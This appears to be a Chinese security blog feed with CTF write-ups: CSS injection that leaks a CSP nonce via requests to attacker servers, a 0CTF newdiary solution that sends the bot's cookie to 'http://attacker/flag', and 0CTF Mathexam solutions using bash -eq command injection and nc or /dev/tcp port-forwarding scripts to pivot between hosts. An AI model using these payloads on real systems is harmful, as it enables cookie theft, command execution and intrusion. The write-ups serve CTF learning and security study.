浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。 firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：CSS data exfiltration in Firefox via a single injection point - research.securitum.com chrome 和 firefox 通用 payload： &lt;style&gt;@import url(https://myserver.com/payload?len=1)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=2)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=3)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=4)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=5)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=6)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=7)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=8)&lt;/style&gt; 更快的枚举 文章 Code Vulnerabilities Put Proton Mails at Risk - Sonar 展示了一种更快的枚举方式。 通过示例代码可以更好地理解： &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"&gt; &lt;/head&gt; &lt;style&gt; :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} :has(script[nonce*="aab"]){--tosend-aab: url(http://192.168.137.98:7777?x=aab);} :has(script[nonce*="aac"]){--tosend-aac: url(http://192.168.137.98:7777?x=aac);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } &lt;/style&gt; &lt;body&gt; &lt;input&gt; &lt;script nonce="nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"&gt; console.log(1) &lt;/script&gt; &lt;/body&gt; 页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。 其中 css 注入 payload 如下。 :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } 其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（*= 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 – 开头），通过这个属性向外发起请求。 定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。 由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求： 如何获取完整的字符串呢？假设 none 值为 32 位随机字符串： qhkkzvf5mc3iv090nyysyq6wc80ai4v1 我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。 {'f5m', 'c3i', 'i4v', '3iv', 'zvf', 'iv0', 'syq', '0ai', '6wc', 'kkz', 'yq6', 'q6w', '5mc', 'c80', '4v1', 'ysy', '0ny', 'yys', 'ai4', '090', 'v09', 'nyy', 'mc3', 'hkk', 'qhk', 'vf5', 'kzv', 'wc8'} 这样一来，只需要较少的请求就可以获取完整的字符串。 0CTF 2023 newdiary 前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。 题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。 题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。 &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"&gt; 但 CSP style-src 设置为 ‘unsafe-inline’ https://unpkg.com”，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。 利用步骤如下： 新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。 &lt;meta http-equiv="refresh" content="0.0;url=http://192.168.137.98:8888/index.html"&gt; 其中 index.html 内容如下： &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; const sleep = (milliseconds) =&gt; new Promise(resolve =&gt; setTimeout(resolve, milliseconds)); async function run(){ bot_window = window.open("http://localhost/share/read#id=1&amp;username="); // Exploit 1, leak nonce await sleep(7000); bot_window.location.href = "http://localhost/share/read#id=2&amp;username="; // Exploit 2, leak cookie await sleep(100); console.log("O"); } run(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。 新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。 &lt;link rel="stylesheet" href="http://unpkg.com/xxx/leak.css"&gt;&lt;input /&gt; 当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。 枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值 &lt;iframe name=asd srcdoc="&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"/&gt; 因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。 bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。 这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。 题目 payload 可参考：CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups 使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。 参考 CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups Beyond XSS]]></summary></entry><entry><title type="html">0CTF/TCTF 2023 Mathexam Writeup</title><link href="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html" rel="alternate" type="text/html" title="0CTF/TCTF 2023 Mathexam Writeup" /><published>2023-12-11T18:29:48+08:00</published><updated>2023-12-11T18:29:48+08:00</updated><id>/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup</id><content type="html" xml:base="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html"><![CDATA[<h1 id="0ctf-mathexam-writeup">0CTF Mathexam Writeup</h1>
<p>mathexam 系列非常有意思，主要考察如何在受限的 bash 下完成端口转发，题目的场景可以适用到一些小设备的渗透中。利用思路总结如下：</p>
<ol>
  <li>mathexam-1：bash -eq 注入</li>
  <li>mathexam-2：利用 busybox nc 完成端口转发。</li>
  <li>mathexam-3：去掉了 buxybox，利用 cat 完成端口转发。</li>
  <li>mathexam-4：进一步去掉了 cat，需要利用纯粹的 bash 完成端口转发。</li>
</ol>

<h2 id="mathexam-1">mathexam-1</h2>
<blockquote>
  <p>The math exam starts now. Participate with integrity and never cheat.</p>

  <p>Someone has stolen the exam paper, and definitely he got full marks.
Fortunately, he didn’t find the flag.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">"You are now in the math examination hall."</span>
<span class="nb">echo</span> <span class="s2">"First, please read exam integrity statement:"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">promisetext</span><span class="o">=</span><span class="s2">"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment"</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nb">echo</span> <span class="s2">"Now, write down the exam integrity statement here:"</span>
<span class="nb">read </span>userinput

<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$userinput</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"All right"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"Error"</span>
    <span class="nb">exit
</span><span class="k">fi

</span><span class="nb">echo</span> <span class="s2">""</span>
<span class="nb">echo</span> <span class="s2">"Exam starts"</span>
<span class="nb">echo</span> <span class="s2">"(notice: numbers in dec, oct or hex format are all accepted)"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">correctcount</span><span class="o">=</span>0
<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..100<span class="o">}</span>
<span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"Problem </span><span class="nv">$i</span><span class="s2"> of 100:"</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2"> + </span><span class="nv">$i</span><span class="s2"> = ?"</span>

    <span class="nv">ans</span><span class="o">=</span><span class="k">$((</span><span class="nv">$i</span><span class="o">+</span><span class="nv">$i</span><span class="k">))</span>
    <span class="nb">read </span>line

    <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> <span class="nt">-eq</span> <span class="s2">"</span><span class="nv">$ans</span><span class="s2">"</span> <span class="o">]]</span>
    <span class="k">then
        </span><span class="nv">correctcount</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span><span class="nv">$correctcount</span><span class="o">+</span><span class="m">1</span><span class="k">))</span><span class="s2">"</span>
    <span class="k">fi
    </span><span class="nb">echo</span> <span class="s2">""</span>
<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"Exam finishes"</span>
<span class="nb">echo</span> <span class="s2">"You score is: </span><span class="nv">$correctcount</span><span class="s2">"</span>

<span class="nb">exit</span>
</code></pre></div></div>
<p>题目给了一个 bash 脚本，获取用户输入并使用 -eq 进行了比较。bash 脚本中这样的语句是可以注入的：<code class="language-plaintext highlighter-rouge">[[ "$VAR" -eq "something" ]]</code>，具体可参考文章：<a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">Arithmetic operation in shell script can be exploited - DEV Community</a></p>

<p>注入 poc：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span><span class="nb">command</span><span class="si">)</span><span class="o">]</span>
</code></pre></div></div>
<p>测试命令时可以发现题目会将错误输出出来，但是标准输出看不到，因此我们将标准输出重定向到错误输出。另外目标环境有 busybox，可以使用下面的 payload 打开交互式 shell，就可以拿到 flag1。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span>/bin/busybox sh 1&gt;&amp;2<span class="si">)</span><span class="o">]</span>
</code></pre></div></div>

<h2 id="mathexam-2">mathexam-2</h2>
<p>拿到第一关 shell 后，可以在根目录中找到一个 .connect.sh.swp 文件，获取该文件的内容可知 second 主机的用户名密码为 ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepf。</p>

<p>获取第二关的 flag 要求我们 ssh 登陆到 second 主机中，但目标环境设置了诸多限制：</p>
<ol>
  <li>没有 ssh</li>
  <li>仅有的二进制文件都在 /bin 目录下
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> drwxr-xr-x    1 0        0             4096 Dec 10 00:11 <span class="nb">.</span>
 drwxr-xr-x    1 0        0             4096 Dec 10 00:11 ..
 <span class="nt">-rwxr-xr-x</span>    1 0        0          1396520 Dec  9 18:44 bash
 <span class="nt">-rwxr-xr-x</span>    1 0        0          2193264 Dec 10 00:11 busybox
 <span class="nt">-rwxr-xr-x</span>    1 0        0            35280 Dec 10 00:11 <span class="nb">cat</span>
 <span class="nt">-rwxr-xr-x</span>    1 0        0           138208 Dec 10 00:11 <span class="nb">ls
 </span>lrwxrwxrwx    1 0        0                4 Dec  9 18:44 sh -&gt; bash
</code></pre></div>    </div>
  </li>
  <li>当前用户对所有文件都没有写权限。</li>
</ol>

<p>也就是说我们需要利用 busybox、bash、cat 来做端口转发，具体思路如下：</p>
<ol>
  <li>通过 busybox nc 连接到 second。此时 busybox nc 与 ssh 服务建立起了 TCP 连接。
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>busybox nc second 22
</code></pre></div>    </div>
  </li>
  <li>我们只需要在该连接中收发数据即可完成 ssh 认证，我们可以通过 python 中的 subprocess 模块来控制终端数据的收发，以此来实现端口转发。</li>
</ol>

<p>编写脚本如下。</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="c1"># 命令和参数
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">nc</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-X</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">connect</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">instance.0ctf2023.ctf.0ops.sjtu.cn:18081</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">kctgxr4bjb6kgj26</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">]</span>

<span class="c1"># 启动进程
</span><span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span>
    <span class="n">command</span><span class="p">,</span> 
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
    <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span>  <span class="c1"># 设置为 0 以关闭缓冲
</span><span class="p">)</span>

<span class="n">thread_close</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">thread_close</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="c1"># 检查是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">reads</span><span class="p">:</span>
            <span class="c1"># 获取文件描述符
</span>            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="c1"># 读取可用的数据
</span>            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>  <span class="c1"># 读取最多 4096 字节
</span>            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>

<span class="c1"># 创建并启动线程
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="c1"># 发送命令
</span><span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">x[$(/bin/busybox sh 1&gt;&amp;2)] </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox ping -c 1 second</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="c1">#监听端口，建立通道
</span><span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># 设置监听端口
</span><span class="n">listen_port</span> <span class="o">=</span> <span class="mi">3333</span>

<span class="c1"># 创建 socket 对象
</span><span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">listen_port</span><span class="p">))</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Listening on port </span><span class="si">{</span><span class="n">listen_port</span><span class="si">}</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># 接受一个连接
</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Connection from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s"> established.</span><span class="sh">"</span><span class="p">)</span>
<span class="n">thread_close</span><span class="o">=</span><span class="mi">1</span>
<span class="c1"># 等待线程结束
</span><span class="n">thread</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox nc second 22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">socket_read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># 检查 process.stdout 是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># 如果 process.stdout 有数据可读，则将数据发送到客户端
</span>        <span class="k">if</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">socket_write_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># 使用 select 监测客户端 socket 是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># 如果客户端有数据可读，则将数据发送到 process.stdin
</span>        <span class="k">if</span> <span class="n">client_socket</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="n">thread1</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread1</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">thread2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_write_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="n">thread1</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

<span class="n">client_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connection closed.</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p>执行该脚本后，会将本地的 3333 端口转发到 second 的 22 端口，这样我们就可以连接到 second 了。</p>
<h2 id="mathexam-3">mathexam-3</h2>
<p>连接到 second 后，flag 文件中会提示第三关的 flag 在 third 主机上，用户名密码不变，我们需要再构建一层代理。不同在与 second 主机中将 busybox 移除了。</p>

<p>没有 nc 的情况下，我们仍然可以使用 exec 或者 cat 连接到远程端口，参考：</p>
<ul>
  <li><a href="https://andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/">Some useful tips about /dev/tcp | Andrea Fortuna</a>
比如：
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> &lt;/dev/tcp/time.nist.gov/13
</code></pre></div>    </div>
    <p>或者使用 exec 将 tcp 连接绑定到描述符 3,然后通过 echo 或者 cat 收发数据。</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/www.google.com/80
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">host: http://www.google.com</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span> <span class="o">&gt;</span>&amp;3
<span class="nb">cat</span> &lt;&amp;3
</code></pre></div>    </div>
    <p>根据这个原理，我们就可以构建出一个类似的收发窗口：</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/third/22   
<span class="nb">cat</span> &lt;&amp;3 &amp;
<span class="nb">cat</span> <span class="o">&gt;</span>&amp;3
</code></pre></div>    </div>
  </li>
</ul>

<ol>
  <li>前两行代码可以替代 <code class="language-plaintext highlighter-rouge">busybox nc third 22</code>，利用 &amp; 可以将读取远程消息的任务放在后台，一旦接收到数据，就可以直接打印在标准输出中。</li>
  <li>cat &gt;&amp;3 会等待用户的输入，用户输入之后会重定向到描述符 3 中，python 脚本中就可以直接用 process.stdin.write 发数据就可以了。</li>
</ol>

<p>利用脚本与上一关的类似，在此前的脚本中做修改即可，需要注意的就是需要在收发前，先执行上面构造的 payload。</p>

<p>exp2.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="kn">import</span> <span class="n">binascii</span>

<span class="c1"># 命令和参数
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">ssh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ctf@127.0.0.1</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-p</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">3333</span><span class="sh">"</span><span class="p">]</span>

<span class="bp">...</span>

<span class="c1"># 创建并启动线程
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#手动输入密码 x5kdkwjr8exi2bf70y8g80bggd2nuepf
</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">whoami</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="bp">...</span>

<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">4444</span>

<span class="bp">...</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">exec 3&lt;&gt;/dev/tcp/third/22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">cat &lt;&amp;3 &amp; </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
